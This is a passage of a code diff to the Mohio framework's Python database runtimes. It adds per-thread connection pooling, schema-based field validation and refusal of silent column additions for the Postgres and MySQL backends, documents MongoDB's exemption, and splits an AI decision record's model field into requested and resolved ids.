+    mn = _int('MOHIO_DB_POOL_MIN', 1)
+    mx = _int('MOHIO_DB_POOL_MAX', 10)
+    if mx < mn:
+        mx = mn
+    return mn, mx, float(_int('MOHIO_DB_POOL_TIMEOUT', 10))
+
+
+class _ThreadLeasedPool:
+    """A connection pool leased PER THREAD, not per statement.
+
+    T0-CONNECTION-POOL (2026-08-30). `PostgresRuntime` and `MySQLRuntime` each held ONE
+    connection in `self.conn`, created once and shared by every ASGI worker thread. Two
+    separate failures came out of that:
+
+      1. Every concurrent request serialized on one connection -- slow requests and timeouts
+         while CPU, memory and the database all read healthy, so nothing looks wrong anywhere.
+      2. Worse, and quieter: `_in_transaction` was ONE boolean on a SHARED object. Two
+         overlapping requests meant one request's `begin`/`commit` moved the other request's
+         transaction boundary. That is cross-request transaction corruption, not slowness.
+
+    WHY PER-THREAD RATHER THAN PER-STATEMENT. The obvious shape -- acquire and release inside
+    each of the ~90 `self.conn` call sites -- fights the requirement that a transaction hold
+    ONE connection across its whole span: a per-statement lease breaks `begin`/`commit` unless
+    every method special-cases it. Leasing per thread satisfies both at once. A thread holds
+    one connection for the whole request, so a transaction is naturally coherent, and the ~90
+    call sites keep reading `self.conn` unchanged. It also answers the leak question the
+    hostile pass asks: the lease is returned at the REQUEST BOUNDARY, so an exception thrown
+    anywhere inside cannot strand a connection -- there is no per-method release to miss on an
+    error path.
+
+    `_in_transaction` moves onto the same thread-local, which is what actually closes bug 2.
+    """
+
+    def _init_pool(self, minconn, maxconn, acquire_timeout):
+        self._min = minconn
+        self._max = maxconn
+        self._acquire_timeout = acquire_timeout
+        self._tls                      # force the thread-local into existence
+
+    @property
+    def _tls(self):
+        """The thread-local store, created on first touch.
+
+        Lazy rather than set in `_init_pool` because a runtime can legitimately be built
+        with `object.__new__(PostgresRuntime)` to bypass `__init__` and avoid opening a
+        socket -- test fixtures do exactly that. An eagerly-required attribute turns that
+        into an AttributeError far from its cause.
+        """
+        tl = self.__dict__.get('_local')
+        if tl is None:
+            tl = _threading.local()
+            self.__dict__['_local'] = tl
+        return tl
+
+    # -- subclasses supply these two --------------------------------------------------
+    def _pool_get(self):
+        raise NotImplementedError
+
+    def _pool_put(self, conn):
+        raise NotImplementedError
+
+    # -- lease management --------------------------------------------------------------
+    def _acquire(self):
+        """Lease a connection for THIS thread, waiting up to the deadline for a free one.
+
+        psycopg2's ThreadedConnectionPool raises immediately when exhausted rather than
+        waiting, so the wait is implemented here. A pool that blocks forever on acquire is
+        the same outage with a different stack trace, so the deadline is not optional.
+        """
+        deadline = _pooltime.monotonic() + self._acquire_timeout
+        attempt = 0
+        while True:
+            try:
+                return self._pool_get()
+            except Exception as e:
+                if not _pool_is_exhausted(e):
+                    raise
+                if _pooltime.monotonic() >= deadline:
+                    raise _PoolExhausted(
+                        f"database connection pool exhausted: all {self._max} connections "
+                        f"were busy for {self._acquire_timeout:.0f}s.\n"
+                        f"    This is load, not a broken query -- the app is asking for more "
+                        f"concurrent database work than the pool allows.\n"
+                        f"    Raise MOHIO_DB_POOL_MAX (currently {self._max}), or reduce "
+                        f"concurrent work. Check the database's own connection limit first: "
+                        f"the pool is per PROCESS, so total connections is pool size times "
+                        f"the number of running machines.") from e
+                attempt += 1
+                _pooltime.sleep(min(0.05 * attempt, 0.25))
+
+    @property
+    def conn(self):
+        """This thread's leased connection, acquired on first use."""
+        c = getattr(self._tls, 'conn', None)
+        if c is None:
+            c = self._acquire()
+            self._tls.conn = c
+        return c
+
+    @conn.setter
+    def conn(self, value):
+        """Bind THIS thread's connection directly.
+
+        Kept because `self.conn = <connection>` was assignable before pooling, and a
+        read-only property silently broke every caller that did so -- including test
+        fixtures that inject a fake connection. Assigning binds the current thread's lease,
+        which is the same scope a real lease has, so injection behaves the way it did.
+        """
+        self._tls.conn = value
+
+    @property
+    def _in_transaction(self):
+        return getattr(self._tls, 'in_transaction', False)
+
+    @_in_transaction.setter
+    def _in_transaction(self, value):
+        self._tls.in_transaction = bool(value)
+
+    def release_thread_connection(self):
+        """Return this thread's connection to the pool. Called at the REQUEST BOUNDARY.
+
+        A lease still inside a transaction is NOT handed back as-is -- giving the next
+        request a half-finished transaction is worse than holding the connection. Roll it
+        back first, so the pool never hands out dirty state.
+        """
+        c = getattr(self._tls, 'conn', None)
+        if c is None:
+            return
+        try:
+            if self._in_transaction:
+                try:
+                    c.rollback()
+                except Exception:
+                    pass
+                self._in_transaction = False
+        finally:
+            self._tls.conn = None
+            try:
+                self._pool_put(c)
+            except Exception:
+                pass
+
+
+class PostgresRuntime(_ThreadLeasedPool, _QueryableRuntime):
     """
     Postgres backend — same interface as DbRuntime.
     Used when connect declares 'as postgres' and DATABASE_URL is set.
     Requires: psycopg2-binary
+
+    Pooled since 2026-08-30 (T0-CONNECTION-POOL). `self.conn` is no longer one shared
+    connection; it is this THREAD's lease from a ThreadedConnectionPool. Every method below
+    still reads `self.conn` unchanged -- see _ThreadLeasedPool for why the lease is per
+    thread and released at the request boundary rather than per statement.
     """
     def __init__(self, url):
         try:
             import psycopg2
             import psycopg2.extras
-            self.conn = psycopg2.connect(url)
-            self.conn.autocommit = False
+            import psycopg2.pool
+            _min, _max, _timeout = _pool_settings()
+            self._init_pool(_min, _max, _timeout)
+            # ThreadedConnectionPool, not a hand-rolled one: psycopg2 already solves the
+            # thread-safe checkout, and a hand-rolled pool is where the subtle bugs live.
+            self._pg_pool = psycopg2.pool.ThreadedConnectionPool(_min, _max, url)
             self._cursor_factory = psycopg2.extras.RealDictCursor
-            self._in_transaction = False
-            # Test connection
+            # Prove the credentials and the pool work NOW, at connect time, rather than
+            # surfacing a bad URL on the first request. Uses the normal lease path so the
+            # release path is exercised too.
             cur = self.conn.cursor()
             cur.execute("SELECT 1")
             cur.close()
             self.conn.commit()
+            self.release_thread_connection()
         except ImportError:
             raise RuntimeError(
                 "PostgreSQL driver not installed.\n"
@@ -1413,6 +2119,35 @@ class PostgresRuntime:
         except Exception as e:
             raise RuntimeError(f"PostgreSQL connection failed: {e}\n"
                                f"Check DATABASE_URL environment variable.")
+
+    def table_columns(self, table):
+        """The safety floor's primitive for Postgres.
+
+        The same information_schema read `ensure_table` already does, exposed so the SHARED
+        validator can use it. Before this, Postgres had no field validation at all: a `where`
+        or `order by` on a misspelled column silently returned the wrong rows on the
+        production backend while SQLite caught it in development.
+        """
+        cache = getattr(self, '_column_cache', None)
+        if cache is None:
+            cache = self._column_cache = {}
+        if table in cache:
+            return cache[table]
+        try:
+            cur = self.conn.cursor()
+            cur.execute("SELECT column_name FROM information_schema.columns "
+                        "WHERE table_name = %s", (table,))
+            rows = cur.fetchall()
+            cur.close()
+        except Exception as e:
+            # An introspection failure must not silently pass validation -- that just moves
+            # the fail-open into the validator itself.
+            raise MohioRuntimeError(
+                f"could not read the schema for table '{table}' to validate a field "
+                f"reference ({e}).")
+        cols = {(r['column_name'] if isinstance(r, dict) else r[0]) for r in rows} or None
+        cache[table] = cols
+        return cols
 
     def _col_defs(self, columns, pk=None, id_value=None, table=None):
         """
@@ -1437,11 +2172,24 @@ class PostgresRuntime:
             parts.append('UNIQUE(' + ', '.join(f'"{c}"' for c in _uniq) + ')')
         return ', '.join(parts)
 
-    def ensure_table(self, table, columns, id_value=None):
+    def ensure_table(self, table, columns, id_value=None, allow_new_columns=False):
         cur = self.conn.cursor()
         cols = self._col_defs(columns, id_value=id_value, table=table)
         try:
             cur.execute(f'CREATE TABLE IF NOT EXISTS "{table}" ({cols})')
+            # MIGRATION-REFUSAL (2026-08-30), same rule as the SQLite runtime: a user write
+            # naming a field the table does not have is refused rather than silently adding
+            # the column. See _schema_drift_error.
+            cur.execute(
+                "SELECT column_name FROM information_schema.columns "
+                "WHERE table_name = %s", (table,))
+            _rows = cur.fetchall()
+            _existing = {(r['column_name'] if isinstance(r, dict) else r[0]) for r in _rows}
+            _drift = [c for c in columns
+                      if c != 'id' and c not in _existing and not str(c).endswith(_BIDX_SUFFIX)]
+            if _drift and _existing and not allow_new_columns:
+                raise MohioRuntimeError(
+                    _schema_drift_error(table, _drift, _existing - {'id'}))
             # Reconcile columns: widen an existing table so a grown schema is applied
             # instead of silently skipped. ADD COLUMN IF NOT EXISTS is idempotent.
             for c in columns:
@@ -1472,6 +2220,7 @@ class PostgresRuntime:
             cur.close()
 
     def retrieve_one(self, table, match_field, match_value):
+        self._validate_fields(table, [match_field])
         try:
             cur = self.conn.cursor(cursor_factory=self._cursor_factory)
             cur.execute(
@@ -1494,7 +2243,10 @@ class PostgresRuntime:
             raise
 
     def find_many(self, table, where=None, limit=None,
-                  order_by=None, order_dir='asc', offset=0):
+                  order_by=None, order_dir='asc', offset=0, order_keys=None):
+        self._validate_fields(table, list((where or {}).keys())
+                              + [f for f, _d in (order_keys or ([(order_by, order_dir)]
+                                                                if order_by else [])) if f])
         try:
             import psycopg2.extras
             cur = self.conn.cursor(cursor_factory=self._cursor_factory)
@@ -1510,7 +2262,7 @@ class PostgresRuntime:
             if limit and not order_by and not offset: sql += f' LIMIT {limit}'
             cur.execute(sql, params)
             rows = _finalize_rows([dict(r) for r in cur.fetchall()],
-                                  order_by, order_dir, limit, offset)
+                                  order_by, order_dir, limit, offset, order_keys)
             cur.close()
             return rows
         except Exception as e:
@@ -1523,6 +2275,7 @@ class PostgresRuntime:
             return []
 
     def count(self, table, where=None):
+        self._validate_fields(table, list((where or {}).keys()))
         """COUNT(*) honoring equality filters — used for pagination totals."""
         cur = self.conn.cursor()
         clauses, params = [], []
@@ -1579,10 +2332,11 @@ class PostgresRuntime:
                 cur.close()
         return cache[table]
 
-    def save(self, table, fields):
+    def save(self, table, fields, allow_new_columns=False):
         from mohio_audit_grades import assert_write_allowed as _awa
         _awa(table)          # audit relations only via the chaining path
-        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'))
+        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'),
+                          allow_new_columns=allow_new_columns)
         cols = ', '.join(f'"{k}"' for k in fields)
         phs  = ', '.join('%s' for _ in fields)
         cur  = self.conn.cursor()
@@ -1659,6 +2413,7 @@ class PostgresRuntime:
         return cache[table]
 
     def update(self, table, updates, match_field, match_value):
+        self._validate_fields(table, [match_field])
         try:
             set_clause = ', '.join(f'"{k}" = %s' for k in updates)
             params = list(updates.values()) + [match_value]
@@ -1679,6 +2434,7 @@ class PostgresRuntime:
             raise
 
     def retrieve_one_multi(self, table, conditions):
+        self._validate_fields(table, list(conditions))
         try:
             if not conditions:
                 return None
@@ -1696,6 +2452,7 @@ class PostgresRuntime:
             raise
 
     def retrieve_one_spec(self, table, spec):
+        self._validate_fields(table, [f for _k, pairs in spec for f, _v in pairs])
         try:
             where, params = _spec_to_sql(spec, '%s', '"')
             cur = self.conn.cursor(cursor_factory=self._cursor_factory)
@@ -1710,6 +2467,7 @@ class PostgresRuntime:
             raise
 
     def retrieve_all_spec(self, table, spec):
+        self._validate_fields(table, [f for _k, pairs in spec for f, _v in pairs])
         """Multi-row retrieve. Empty spec means every row."""
         try:
             cur = self.conn.cursor(cursor_factory=self._cursor_factory)
@@ -1728,6 +2486,7 @@ class PostgresRuntime:
             raise
 
     def update_multi(self, table, updates, conditions):
+        self._validate_fields(table, list(conditions))
         try:
             if not conditions:
                 return 0
@@ -1764,7 +2523,8 @@ class PostgresRuntime:
         concurrent insert landing between steps cannot produce a duplicate row.
         """
         match_cols = [match_field] if isinstance(match_field, str) else list(match_field)
-        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'))
+        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'),
+                          allow_new_columns=False)
         set_cols = [k for k in fields if k not in match_cols]
         where    = ' AND '.join(f'"{c}" = %s' for c in match_cols)
         key_vals = [fields.get(c) for c in match_cols]
@@ -1813,6 +2573,7 @@ class PostgresRuntime:
         return count
 
     def remove(self, table, match_field, match_value):
+        self._validate_fields(table, [match_field])
         try:
             cur = self.conn.cursor()
             cur.execute(
@@ -1831,6 +2592,7 @@ class PostgresRuntime:
             raise
 
     def remove_multi(self, table, conditions):
+        self._validate_fields(table, list(conditions))
         try:
             if not conditions:
                 return 0
@@ -1854,7 +2616,8 @@ class PostgresRuntime:
         implementation for the full reasoning."""
         from mohio_audit_grades import assert_write_allowed as _awa
         _awa(table)
-        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'))
+        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'),
+                          allow_new_columns=False)
         cols  = ', '.join(f'"{k}"' for k in fields)
         phs   = ', '.join('%s' for _ in fields)
         where = ' AND '.join(f'"{c}" = %s' for c in key_cols)
@@ -1881,6 +2644,14 @@ class PostgresRuntime:
             except Exception: pass
             raise
 
+    def _pool_get(self):
+        c = self._pg_pool.getconn()
+        c.autocommit = False
+        return c
+
+    def _pool_put(self, conn):
+        self._pg_pool.putconn(conn)
+
     def begin_transaction(self):
         self._in_transaction = True
         self.conn.autocommit = False
@@ -1894,16 +2665,67 @@ class PostgresRuntime:
         self._in_transaction = False
 
     def close(self):
-        self.conn.close()
+        # Close the POOL, not just this thread's lease. Closing one leased connection would
+        # leave every other pooled connection open -- the shape of a slow file/socket leak.
+        try:
+            self.release_thread_connection()
+        finally:
+            self._pg_pool.closeall()
 
 
-class MySQLRuntime:
+class _BoundedConnPool:
+    """A minimal bounded pool for drivers that ship none (pymysql).
+
+    Deliberately small: a free-list plus a live count, both under one lock. It creates a
+    connection on demand up to `maxconn`, then reports exhaustion so _ThreadLeasedPool's
+    deadline logic can wait and finally fail loud. psycopg2 gets the real
+    ThreadedConnectionPool instead -- this exists only because pymysql has no equivalent.
+    """
+
+    def __init__(self, maxconn, factory):
+        self._factory = factory
+        self._max = maxconn
+        self._free = []
+        self._live = 0
+        self._lock = _threading.Lock()
+
+    def getconn(self):
+        with self._lock:
+            if self._free:
+                return self._free.pop()
+            if self._live >= self._max:
+                raise RuntimeError('connection pool exhausted')
+            self._live += 1
+        try:
+            return self._factory()
+        except Exception:
+            with self._lock:
+                self._live -= 1
+            raise
+
+    def putconn(self, conn):
+        with self._lock:
+            self._free.append(conn)
+
+    def closeall(self):
+        with self._lock:
+            free, self._free, self._live = self._free, [], 0
+        for c in free:
+            try:
+                c.close()
+            except Exception:
+                pass
+
+
+class MySQLRuntime(_ThreadLeasedPool, _QueryableRuntime):
     """
     MySQL/MariaDB backend — same interface as DbRuntime.
     MariaDB is fully compatible — declare as mysql or mariadb.
     Requires: pymysql
     connect db as mysql from env.MYSQL_URL
     connect db as mariadb from env.MYSQL_URL
+
+    Pooled since 2026-08-30 (T0-CONNECTION-POOL), same lease discipline as PostgresRuntime.
     """
     def __init__(self, url):
         try:
@@ -1912,16 +2734,24 @@ class MySQLRuntime:
             # Parse URL: mysql://user:pass@host:port/dbname
             import urllib.parse as _up
             p = _up.urlparse(url)
-            self.conn = pymysql.connect(
-                host=p.hostname or 'localhost',
-                port=p.port or 3306,
-                user=p.username,
-                password=p.password,
-                database=p.path.lstrip('/'),
-                cursorclass=pymysql.cursors.DictCursor,
-                autocommit=False,
-            )
-            self._in_transaction = False
+            _min, _max, _timeout = _pool_settings()
+            self._init_pool(_min, _max, _timeout)
+
+            def _make():
+                return pymysql.connect(
+                    host=p.hostname or 'localhost',
+                    port=p.port or 3306,
+                    user=p.username,
+                    password=p.password,
+                    database=p.path.lstrip('/'),
+                    cursorclass=pymysql.cursors.DictCursor,
+                    autocommit=False,
+                )
+            self._my_pool = _BoundedConnPool(_max, _make)
+            # Prove the credentials work at connect time rather than on the first request,
+            # and exercise the release path once.
+            self.conn.ping(reconnect=False)
+            self.release_thread_connection()
         except ImportError:
             raise RuntimeError(
                 "MySQL driver not installed.\n"
@@ -1932,7 +2762,29 @@ class MySQLRuntime:
             raise RuntimeError(f"MySQL connection failed: {e}\n"
                                f"Check MYSQL_URL environment variable.")
 
-    def ensure_table(self, table, columns, id_value=None):
+    def table_columns(self, table):
+        """The safety floor's primitive for MySQL. The `AS col` alias is load-bearing: MySQL 8
+        reports information_schema labels in upper case on some servers, so an unaliased read
+        works on one and KeyErrors on another (T1-MYSQL-DICTCURSOR-INDEX)."""
+        cache = getattr(self, '_column_cache', None)
+        if cache is None:
+            cache = self._column_cache = {}
+        if table in cache:
+            return cache[table]
+        try:
+            cur = self.conn.cursor()
+            cur.execute("SELECT column_name AS col FROM information_schema.columns "
+                        "WHERE table_schema = DATABASE() AND table_name = %s", (table,))
+            rows = cur.fetchall()
+        except Exception as e:
+            raise MohioRuntimeError(
+                f"could not read the schema for table '{table}' to validate a field "
+                f"reference ({e}).")
+        cols = {(r['col'] if isinstance(r, dict) else r[0]) for r in rows} or None
+        cache[table] = cols
+        return cols
+
+    def ensure_table(self, table, columns, id_value=None, allow_new_columns=False):
         field_cols = [c for c in columns if c != 'id']
         _s = id_value.strip() if isinstance(id_value, str) else None
         _id_is_text = _s is not None and not (_s.isdigit() or (_s[:1] == '-' and _s[1:].isdigit()))
@@ -1963,6 +2815,11 @@ class MySQLRuntime:
         cur.execute("SELECT column_name AS col FROM information_schema.columns "
                     "WHERE table_schema = DATABASE() AND table_name = %s", (table,))
         existing = {(r['col'] if isinstance(r, dict) else r[0]) for r in cur.fetchall()}
+        # MIGRATION-REFUSAL (2026-08-30), same rule as the other runtimes.
+        _drift = [c for c in columns
+                  if c != 'id' and c not in existing and not str(c).endswith(_BIDX_SUFFIX)]
+        if _drift and existing and not allow_new_columns:
+            raise MohioRuntimeError(_schema_drift_error(table, _drift, existing - {'id'}))
         for c in columns:
             if c not in existing:
                 cur.execute(f'ALTER TABLE `{table}` ADD COLUMN `{c}` TEXT')
@@ -1971,6 +2828,7 @@ class MySQLRuntime:
         cur.close()
 
     def retrieve_one(self, table, match_field, match_value):
+        self._validate_fields(table, [match_field])
         try:
             cur = self.conn.cursor()
             cur.execute(
@@ -1990,7 +2848,10 @@ class MySQLRuntime:
             raise
 
     def find_many(self, table, where=None, limit=None,
-                  order_by=None, order_dir='asc', offset=0):
+                  order_by=None, order_dir='asc', offset=0, order_keys=None):
+        self._validate_fields(table, list((where or {}).keys())
+                              + [f for f, _d in (order_keys or ([(order_by, order_dir)]
+                                                                if order_by else [])) if f])
         try:
             cur = self.conn.cursor()
             clauses, params = [], []
@@ -2005,7 +2866,7 @@ class MySQLRuntime:
             if limit and not order_by and not offset: sql += f' LIMIT {int(limit)}'
             cur.execute(sql, params)
             rows = _finalize_rows([dict(r) for r in cur.fetchall()],
-                                  order_by, order_dir, limit, offset)
+                                  order_by, order_dir, limit, offset, order_keys)
             cur.close()
             return rows
         except Exception as e:
@@ -2018,6 +2879,7 @@ class MySQLRuntime:
             return []
 
     def count(self, table, where=None):
+        self._validate_fields(table, list((where or {}).keys()))
         """COUNT(*) honoring equality filters — used for pagination totals."""
         cur = self.conn.cursor()
         clauses, params = [], []
@@ -2042,10 +2904,11 @@ class MySQLRuntime:
         n = row['cnt'] if isinstance(row, dict) else row[0]
         return int(n)
 
-    def save(self, table, fields):
+    def save(self, table, fields, allow_new_columns=False):
         from mohio_audit_grades import assert_write_allowed as _awa
         _awa(table)          # audit relations only via the chaining path
-        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'))
+        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'),
+                          allow_new_columns=allow_new_columns)
         cols = ', '.join(f'`{k}`' for k in fields)
         phs  = ', '.join('%s' for _ in fields)
         cur  = self.conn.cursor()
@@ -2059,6 +2922,7 @@ class MySQLRuntime:
         return row_id
 
     def update(self, table, updates, match_field, match_value):
+        self._validate_fields(table, [match_field])
         try:
             set_clause = ', '.join(f'`{k}` = %s' for k in updates)
             params = list(updates.values()) + [match_value]
@@ -2079,6 +2943,7 @@ class MySQLRuntime:
             raise
 
     def retrieve_one_multi(self, table, conditions):
+        self._validate_fields(table, list(conditions))
         try:
             if not conditions:
                 return None
@@ -2096,6 +2961,7 @@ class MySQLRuntime:
             raise
 
     def retrieve_one_spec(self, table, spec):
+        self._validate_fields(table, [f for _k, pairs in spec for f, _v in pairs])
         try:
             where, params = _spec_to_sql(spec, '%s', '`')
             cur = self.conn.cursor()
@@ -2110,6 +2976,7 @@ class MySQLRuntime:
             raise
 
     def retrieve_all_spec(self, table, spec):
+        self._validate_fields(table, [f for _k, pairs in spec for f, _v in pairs])
         """Multi-row retrieve. Empty spec means every row."""
         try:
             cur = self.conn.cursor()
@@ -2128,6 +2995,7 @@ class MySQLRuntime:
             raise
 
     def update_multi(self, table, updates, conditions):
+        self._validate_fields(table, list(conditions))
         try:
             if not conditions:
                 return 0
@@ -2163,7 +3031,8 @@ class MySQLRuntime:
         `FROM DUAL` + derived-table wrapper -- mirrored from that sibling, not invented here.
         """
         match_cols = [match_field] if isinstance(match_field, str) else list(match_field)
-        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'))
+        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'),
+                          allow_new_columns=False)
         set_cols = [k for k in fields if k not in match_cols]
         where    = ' AND '.join(f'`{c}` = %s' for c in match_cols)
         key_vals = [fields.get(c) for c in match_cols]
@@ -2212,6 +3081,7 @@ class MySQLRuntime:
         return count
 
     def remove(self, table, match_field, match_value):
+        self._validate_fields(table, [match_field])
         try:
             cur = self.conn.cursor()
             cur.execute(
@@ -2230,6 +3100,7 @@ class MySQLRuntime:
             raise
 
     def remove_multi(self, table, conditions):
+        self._validate_fields(table, list(conditions))
         try:
             if not conditions:
                 return 0
@@ -2253,7 +3124,8 @@ class MySQLRuntime:
         the table it inserts into without an alias, hence the derived-table wrapper."""
         from mohio_audit_grades import assert_write_allowed as _awa
         _awa(table)
-        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'))
+        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'),
+                          allow_new_columns=False)
         cols  = ', '.join(f'`{k}`' for k in fields)
         phs   = ', '.join('%s' for _ in fields)
         where = ' AND '.join(f'`{c}` = %s' for c in key_cols)
@@ -2276,17 +3148,47 @@ class MySQLRuntime:
             except Exception: pass
             raise
 
+    def _pool_get(self):
+        return self._my_pool.getconn()
+
+    def _pool_put(self, conn):
+        self._my_pool.putconn(conn)
+
     def begin_transaction(self):    self._in_transaction = True
     def commit_transaction(self):   self.conn.commit();   self._in_transaction = False
     def rollback_transaction(self): self.conn.rollback(); self._in_transaction = False
-    def close(self):                self.conn.close()
+    def close(self):
+        # Close the POOL, not just this thread's lease -- see PostgresRuntime.close.
+        try:
+            self.release_thread_connection()
+        finally:
+            self._my_pool.closeall()
 
 
 # MariaDB is MySQL-compatible — same class, same driver
 MariaDBRuntime = MySQLRuntime
 
 
-class MongoRuntime:
+class MongoRuntime(_QueryableRuntime):
+    # DECLARED exemption from field validation, with the reason, per the safety floor's
+    # contract. This is NOT "Mongo was forgotten" -- the idea genuinely does not transfer.
+    #
+    # A relational table has ONE column list, so a field that is not in it is a typo, full
+    # stop. A Mongo collection has no such list: documents legitimately differ in shape, a
+    # field may exist on some documents and not others, and a query naming a field no document
+    # has is a valid query that correctly matches nothing. There is no schema to check against
+    # that would not be a guess about what the collection is "supposed" to contain.
+    #
+    # The RISK does not vanish -- a misspelled field still quietly matches nothing, exactly as
+    # it does in any document store. Mohio's answer for that is shape-as-contract enforced at
+    # the write boundary (Q42), not schema introspection here. Recorded so the gap is a
+    # decision on the record rather than an oversight nobody wrote down.
+    supports_field_validation = False
+    field_validation_note = (
+        "MongoDB is schemaless: a collection has no column list to validate against, and "
+        "documents legitimately differ in shape. Field-name safety for Mongo comes from the "
+        "shape contract at the write boundary, not from schema introspection at read time.")
+
     """
     MongoDB backend — same interface as DbRuntime.
     Collections = tables. Documents = rows. _id = primary key.
@@ -2343,15 +3245,21 @@ class MongoRuntime:
             raise
 
     def find_many(self, table, where=None, limit=None,
-                  order_by=None, order_dir='asc', offset=0):
+                  order_by=None, order_dir='asc', offset=0, order_keys=None):
         try:
             col = self._mongo_db[table]
             query = _mongo_id_filter(where or {})
             cursor = col.find(query)
-            if order_by:
+            if order_by or order_keys:
                 import pymongo
-                direction = pymongo.ASCENDING if order_dir == 'asc' else pymongo.DESCENDING
-                cursor = cursor.sort(order_by, direction)
+                # Mongo is the one backend that sorts in the driver rather than in Python, so
+                # the full key list is handed over as pymongo's own [(field, direction), ...]
+                # form. Passing only the first key here would reintroduce the dropped-key bug
+                # on exactly one backend, which is the worst place for it to hide.
+                _keys = order_keys or [(order_by, order_dir)]
+                cursor = cursor.sort([
+                    (f, pymongo.ASCENDING if d == 'asc' else pymongo.DESCENDING)
+                    for f, d in _keys if f])
             if offset:
                 cursor = cursor.skip(int(offset))
             if limit:
@@ -2376,7 +3284,16 @@ class MongoRuntime:
             # missed for this backend when count() was hardened elsewhere.
             raise
 
-    def save(self, table, fields):
+    def save(self, table, fields, allow_new_columns=False):
+        # `allow_new_columns` is ACCEPTED AND IGNORED here, deliberately, so the runtimes keep
+        # one interface -- but Mongo is NOT protected by MIGRATION-REFUSAL and must not be
+        # read as though it were. The refusal works by diffing declared fields against the
+        # table's real columns; a document store has no such column list (ensure_table ignores
+        # `columns` entirely and only creates the collection), and documents legitimately
+        # differ in shape. The RISK still exists -- writing `email_address` instead of `email`
+        # produces documents a later `where email` cannot see -- but the MECHANISM does not
+        # transfer. Mongo's protection has to come from shape-as-allowlist enforced at write
+        # time (Q42), not from here. Recorded as a decided gap, not an oversight.
         try:
             col = self._mongo_db[table]
             result = col.insert_one(fields)
@@ -2435,6 +3352,31 @@ class MongoRuntime:
             return out
         except Exception:
             raise
+
+    def table_identity(self, table):
+        """The columns that identify a document here: always `id`, and the engine guarantees it.
+
+        THE SAME QUESTION the SQLite and Postgres runtimes answer, asked where there is no
+        catalogue to ask. Those two read a declared primary key or a unique index out of the
+        database, and return () when the table guarantees nothing, so a caller can say "unknown"
+        instead of inventing an identity. Mongo needs no lookup: every document has `_id`, unique
+        by definition, created by the engine when nothing supplies one. Reporting it is not a
+        guess about how a collection is keyed, which is what the refusal below exists to prevent;
+        it is the one thing a document store does promise.
+
+        `id` rather than `_id` is deliberate. That is the name the row carries once it has been
+        read (`doc['id'] = str(doc.pop('_id'))`), and `_mongo_id_filter` turns it back into an
+        ObjectId on the way into a query, so a caller matching on what it read matches the right
+        document.
+
+        WHY THIS WAS MISSING AND WHAT IT COST. `modify` asks the backend what identifies a row,
+        and refuses when the backend cannot be asked at all -- a deliberate refusal, chosen over
+        matching on every column, which silently missed rows holding NULL and rewrote duplicates
+        together. Only SQLite and Postgres could answer, so on Mongo every `modify` raised
+        `modify_identity_unavailable` and the operation the backlog item
+        T1-TABLE-IDENTITY-MYSQL-MONGO was tracking simply did not work.
+        """
+        return ('id',)
 
     def update_multi(self, table, updates, conditions):
         try:
@@ -2552,21 +3494,21 @@ def _make_db_runtime(driver: str, db_path: str = ':memory:'):
     if driver in ('postgres', 'postgresql'):
         url = (os.environ.get('DATABASE_URL') or '').strip()
         if url:
-            return PostgresRuntime(url)
+            return _floor_checked(PostgresRuntime(url), 'postgres')
         _missing(['DATABASE_URL'])
 
     elif driver in ('mysql', 'mariadb'):
         url = ((os.environ.get('MYSQL_URL') or os.environ.get('DATABASE_URL') or '')
                .strip())
         if url:
-            return MySQLRuntime(url)
+            return _floor_checked(MySQLRuntime(url), 'mysql')
         _missing(['MYSQL_URL', 'DATABASE_URL'])
 
     elif driver in ('mongodb', 'mongo'):
         url = ((os.environ.get('MONGO_URL') or os.environ.get('MONGODB_URL') or '')
                .strip())
         if url:
-            return MongoRuntime(url)
+            return _floor_checked(MongoRuntime(url), 'mongodb')
         _missing(['MONGO_URL', 'MONGODB_URL'])
 
     elif driver not in ('sqlite', 'sqlite3', ''):
@@ -2583,7 +3525,14 @@ def _make_db_runtime(driver: str, db_path: str = ':memory:'):
     else:
         print(f"  [connect] SQLite file {db_path} -- data lives in this one file. On a "
               f"host that resets its disk or sleeps the machine, it does not survive.")
-    return DbRuntime(db_path)
+    return _floor_checked(DbRuntime(db_path), 'sqlite')
+
+
+def _floor_checked(runtime, driver_name):
+    """Every connection goes through here, so the safety floor is checked ONCE, above the
+    runtimes -- including for a connector this repo never wrote."""
+    assert_satisfies_safety_floor(runtime, driver_name)
+    return runtime
 
 
 def _sniff_driver(target):
@@ -2614,8 +3563,14 @@ def _sniff_driver(target):
 class AiDecision:
     result:      Any
     confidence:  float
-    model:       str
+    model:       str          # WHICH WEIGHTS ANSWERED -- the provider-resolved id (Q97)
     inputs:      dict
+    # WHICH MODEL WAS ASKED FOR -- the alias the program named, before the provider resolved it
+    # (Q97, 2026-09-01). These were one field, answering two different questions, and Q97 made
+    # the difference matter: `model` now records what actually ran, so the audit can tell two
+    # decisions a year apart apart. Model-RESOLUTION behaviour (chain / override / default
+    # order) is about which alias was chosen and is asserted against this field instead.
+    requested_model: str = ""
     explanation: Optional[str] = None
     fell_back:   bool = False
     tokens:      int   = 0    # real usage for the boundary gate (2026-08-06, matches AgentTurn)
@@ -2638,12 +3593,49 @@ class AgentTurn:
     cost:       float = 0.0
 
 
+# The return types `ai.decide` can genuinely produce. ONE definition, because the mock, the
+# real-provider coercion and the compile-time refusal must agree -- three copies would drift,
+# and a type missing from one of them is precisely the silent-corruption bug this closes.
+#
+# `int` and `dec` are here because CLAUDE.md makes them CANONICAL (`number`/`num` are retired
+# in their favour). They were missing while the RETIRED `number` worked, so the canonical
+# spellings silently produced "not confident" on every call -- backwards.
+def _ai_return_type_message(return_type):
+    """Why an ai.decide return type is refused, and what to write instead."""
+    shown = ', '.join(AI_DECIDE_RETURN_TYPES)
+    if str(return_type).startswith('sh.'):
+        return (f"ai.decide cannot return a shape yet: `returns {return_type}` is declared but "
+                f"the shape-return path is not built.\n"
+                f"    It does not fail -- it silently answers `not confident` on every call, "
+                f"whatever the inputs, so the decision never actually runs.\n"
